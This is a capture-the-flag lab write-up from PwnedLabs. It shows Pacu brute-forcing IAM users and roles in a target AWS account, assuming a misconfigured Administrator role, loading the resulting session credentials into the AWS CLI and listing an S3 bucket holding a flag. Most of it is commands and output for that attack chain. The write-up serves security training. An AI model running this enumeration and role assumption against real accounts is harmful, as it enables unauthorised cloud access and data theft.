---
title: Lab Writeup - Unauthenticated AWS IAM Principals Enumeration
layout: post
date: 2025-06-25
categories: [Writeups, PwnedLabs]
tags: [Cloud, CTF, Pacu, IAM]
author: bailee
toc: true
description: Given an AWS Account ID, carry out comprehensive IAM enumeration and uncover vulnerabilities.
---
Lab Platform: 
 : [PwnedLabs](https://pwnedlabs.io/labs/unauthenticated-aws-iam-principals-enumeration)

---
## Tools, Commands, & Resources

### Tools Used
- Pacu

### Commands
- Pacu Commands
  - `import_keys <profile-name>`
     - Import access keys from ~/.aws/credentials to Pacu with the given profile as an alias. 
  - `import_keys --all` 
     - Import all profiles stored in ~/.aws/credentials to Pacu
  - `run <module-name> --region(s) <region(s)>`
      - Run the specified module with the specified region(s). 
      - The region part is optional, you can set it earlier with the `import-keys` command.


### References
- <https://github.com/RhinoSecurityLabs/pacu/wiki/Detailed-Usage-Guide>
- <https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details>

---

## Lab Walkthrough

### Enumeration
Enumeration is one of the first steps an attacker will take when they get into an environment. What sorts of resources do they have access to? Can they build a map of their visibility? Knowing what is visible will help to find misconfigurations. Misconfigurations like:
- Missing MFA
- Too many privileges
- Improperly configured policies

By creating a trust policy with an implicit deny and the target AWS account ID, you can brute-force what IAM accounts/roles do or do not exist in a AWS account. This is done by attempting the sts:AssumeRole action, which allows you to assume a role even if it’s in another AWS account. If this isn’t configured correctly, it could allow for lateral movement into the target AWS account.
> *Note:* It isn’t just sts:AssumeRole, s3:GetObject and lambda:GetFunction can do it as well. (Though for Lambda it’s a little bit different - not a trust policy but the Lamda function itself.)
>> *Note Note:* This can *also* be done in the AWS console log in screen, where you brute force email addresses on the ‘root user sign in’ option.

**Pacu** - Metasploit for the Cloud - automates this! In it’s iam__enum_users and iam__enum_roles modules, it will fish for user accounts & roles that exist in the target AWS account. 

<span style="font-size: 1.2em;">The **iam__enum_users** module:</span>
> Enumerates IAM users in a separate AWS account, given the account ID.
>
> This module takes in a valid AWS account ID and tries to enumerate existing IAM users within that account. It does so by trying to update the AssumeRole policy document of the role that you pass into --role-name. For your safety, it updates the policy with an explicit deny against the AWS account/IAM user, so that no security holes are opened in your account during enumeration. NOTE: It is recommended to use personal AWS access keys for this script, as it will spam CloudTrail with "iam:UpdateAssumeRolePolicy" logs. The target account will not see anything in their logs though! The keys used must have the iam:UpdateAssumeRolePolicy permission on the role that you pass into --role-name to be able to identify a valid IAM user.


<span style="font-size: 1.2em;">The **iam__enum_roles** module:</span>
> Enumerates IAM roles in a separate AWS account, given the account ID.
>
> This module takes in a valid AWS account ID and tries to enumerate existing IAM roles within that account. It does so by trying to update the AssumeRole policy document of the role that you pass into --role-name if passed or newlycreated role. For your safety, it updates the policy with an explicit deny against the AWS account/IAM role, so that no security holes are opened in your account during enumeration. NOTE: It is recommended to use personal AWS access keys for this script, as it will spam CloudTrail with "iam:UpdateAssumeRolePolicy" logs and a few "sts:AssumeRole" logs. The target account will not see anything in their logs though, unless you find a misconfigured role that allows you to assume it. The keys used must have the iam:UpdateAssumeRolePolicy permission on the role that you pass into --role-name to be able to identify a valid IAM role and the sts:AssumeRole permission to try and request credentials for any enumerated roles.


I got Pacu working on my machine and ran the two modules, using the role-name ‘IAMEnum’ (the name of the trust policy used for brute-forcing) and the target AWS account ID 104506445608.

iam__enum_users

```
Pacu (pwnedlabs6:No Keys Set) > run iam__enum_users --role-name IAMEnum --account-id 104506445608
  Running module iam__enum_users...
[iam__enum_users] Warning: This script does not check if the keys you supplied have the correct permissions. Make sure they are allowed to use iam:UpdateAssumeRolePolicy on the role that you pass into --role-name!

  Access keys not currently set, do you want to use the system default credentials? (y/n): Y
[iam__enum_users]   Setting keys from AWS system default credentials
  Setting keys for account: 348887239824
[iam__enum_users] Targeting account ID: 104506445608

[iam__enum_users] Starting user enumeration...

[iam__enum_users]   Found user: arn:aws:iam::104506445608:user/Bryan
[iam__enum_users]   Found user: arn:aws:iam::104506445608:user/Cloud9
[iam__enum_users]   Found user: arn:aws:iam::104506445608:user/CloudWatch
[iam__enum_users]   Found user: arn:aws:iam::104506445608:user/DatabaseAdministrator
[iam__enum_users]   Found user: arn:aws:iam::104506445608:user/DynamoDB
[iam__enum_users]   Found user: arn:aws:iam::104506445608:user/audit
[iam__enum_users]   Found user: arn:aws:iam::104506445608:user/dbadmin
[iam__enum_users]   Found user: arn:aws:iam::104506445608:user/intern

[iam__enum_users] Found 8 user(s):

[iam__enum_users]     arn:aws:iam::104506445608:user/Bryan
[iam__enum_users]     arn:aws:iam::104506445608:user/Cloud9
[iam__enum_users]     arn:aws:iam::104506445608:user/CloudWatch
[iam__enum_users]     arn:aws:iam::104506445608:user/DatabaseAdministrator
[iam__enum_users]     arn:aws:iam::104506445608:user/DynamoDB
[iam__enum_users]     arn:aws:iam::104506445608:user/audit
[iam__enum_users]     arn:aws:iam::104506445608:user/dbadmin
[iam__enum_users]     arn:aws:iam::104506445608:user/intern

[iam__enum_users] iam__enum_users completed.

[iam__enum_users] MODULE SUMMARY:

  8 user(s) found after 1136 guess(es).
```

iam__enum_roles

```
Pacu (pwnedlabs6:from_default-348887239824) > run iam__enum_roles --role-name IAMEnum --account-id 104506445608
  Running module iam__enum_roles...
[iam__enum_roles] Warning: This script does not check if the keys you supplied have the correct permissions. Make sure they are allowed to use iam:UpdateAssumeRolePolicy on the role that you pass into --role-name and are allowed to use sts:AssumeRole to try and assume any enumerated roles!

[iam__enum_roles] Targeting account ID: 104506445608

[iam__enum_roles] Starting role enumeration...

[iam__enum_roles]   Found role: arn:aws:iam::104506445608:role/APIGateway

[iam__enum_roles]   Found role: arn:aws:iam::104506445608:role/Administrator

[iam__enum_roles]   Found role: arn:aws:iam::104506445608:role/AutoScaling

[iam__enum_roles]   Found role: arn:aws:iam::104506445608:role/DatadogAWSIntegrationRole

[iam__enum_roles]   Found role: arn:aws:iam::104506445608:role/OrganizationAccountAccessRole

[iam__enum_roles]   Found role: arn:aws:iam::104506445608:role/batch

[iam__enum_roles] Found 6 role(s):

[iam__enum_roles]     arn:aws:iam::104506445608:role/APIGateway
[iam__enum_roles]     arn:aws:iam::104506445608:role/Administrator
[iam__enum_roles]     arn:aws:iam::104506445608:role/AutoScaling
[iam__enum_roles]     arn:aws:iam::104506445608:role/DatadogAWSIntegrationRole
[iam__enum_roles]     arn:aws:iam::104506445608:role/OrganizationAccountAccessRole
[iam__enum_roles]     arn:aws:iam::104506445608:role/batch

[iam__enum_roles] Checking to see if any of these roles can be assumed for temporary credentials...

[iam__enum_roles]   Role can be assumed, but hit max session time limit, reverting to minimum of 1 hour...

[iam__enum_roles]   Successfully assumed role for 1 hour: arn:aws:iam::104506445608:role/Administrator

[iam__enum_roles] {
  "Credentials": {
    "AccessKeyId": "ASIA********AXYQMKJY",
    "SecretAccessKey": "ThN0lr0Bm3************s+DXNaJwl",
    "SessionToken": "FwoGZXIvYXdzEI3//////////wEaDNZ3Hvjf0W6+Xbc95yK4AbPMZeRMS4YQkAL3/9tJcTqkXRIPU/8hhZSm3r3JiJ5kLuX0FP3Uhdi1c/tzJq+mMH/PoHoOXEpSSE0FZy1B6rCkW1bHVety/fTrkimPhQRTIwKBVvC1bA669hHgiLy8oPXSBmypIKJtctFm3X8jY5AdMMseGduY5UD8hkUUxYR7ZEyUaM3jl3fwSae1NHtA6w0rjLLDb2nA7YrnJjWvb2uyDAiTPRStBfsSW0AdQMIRzx9iiI161DUousCJwgYyLVyIn3xLmULlhraorXScnnt+xD/VkIGPMu4o/spK95lIlIR4NgIfF/pA8qh8+w==",
    "Expiration": "2025-06-06 04:27:54+00:00"
  },
  "AssumedRoleUser": {
    "AssumedRoleId": "AROARQVIRZ4UAFUYOQHO7:yjqtzbhSHn2ISI6lDAah",
    "Arn": "arn:aws:sts::104506445608:assumed-role/Administrator/yjqtzbhSHn2ISI6lDAah"
  }
}
Reverting the IAMEnum trust policy.
```

Pacu found a 8 users and 6 roles after brute forcing. Even better, it looked to see which role it could try to assume and automatically assumed the Administrator role! It has never been so easy.

### Initial Access

I used AWS configure to access the new role.

```
┌──(kali㉿kali)-[~/Desktop/pacu]
└─$ aws configure --profile "adminPacuLab"
AWS Access Key ID [****************MKJY]: ASIAR**********XYQMKJY
AWS Secret Access Key [****************aJwl]: ThN0lr0Bm****************Es+DXNaJwl
Default region name [None]:
Default output format [None]:

┌──(kali㉿kali)-[~/Desktop/pacu]
└─$ aws configure set aws_session_token "FwoGZXIvYXdzEI3//////////wEaDNZ3Hvjf0W6+Xbc95yK4AbPMZeRMS4YQkAL3/9tJcTqkXRIPU/8hhZSm3r3JiJ5kLuX0FP3Uhdi1c/tzJq+mMH/PoHoOXEpSSE0FZy1B6rCkW1bHVety/fTrkimPhQRTIwKBVvC1bA669hHgiLy8oPXSBmypIKJtctFm3X8jY5AdMMseGduY5UD8hkUUxYR7ZEyUaM3jl3fwSae1NHtA6w0rjLLDb2nA7YrnJjWvb2uyDAiTPRStBfsSW0AdQMIRzx9iiI161DUousCJwgYyLVyIn3xLmULlhraorXScnnt+xD/VkIGPMu4o/spK95lIlIR4NgIfF/pA8qh8+w==" --profile "adminPacuLab"

┌──(kali㉿kali)-[~/Desktop/pacu]
└─$ aws sts get-caller-identity --profile adminPacuLab
{
    "UserId": "AROARQVIRZ4UAFUYOQHO7:yjqtzbhSHn2ISI6lDAah",
    "Account": "104506445608",
    "Arn": "arn:aws:sts::104506445608:assumed-role/Administrator/yjqtzbhSHn2ISI6lDAah"
}
```

So now, let’s see what this role does.

```
$ aws iam get-role --role-name Administrator --profile adminPacuLab
{
    "Role": {
        "Path": "/",
        "RoleName": "Administrator",
        "RoleId": "AROARQVIRZ4UAFUYOQHO7",
        "Arn": "arn:aws:iam::104506445608:role/Administrator",
        "CreateDate": "2023-06-27T12:40:47+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "*"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "StringEquals": {
                            "aws:username": "policyuser"
                        }
                    }
                }
            ]
        },
        "Description": "Manages the IT infra and it-admin-hl bucket",
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {
            "LastUsedDate": "2025-06-05T21:52:10+00:00",
            "Region": "us-east-1"
        }
    }
}
```

### Exfiltration

The description says this role manages ‘IT infra and it-admin-hl bucket’. So there is a ‘it-admin-hl’ S3 bucket accessible. What’s in there?

```
$ aws s3 ls it-admin-hl --profile adminPacuLab
2023-06-30 09:28:08         32 flag.txt
```

The flag! Well, I’m going to cat that and be on my way :D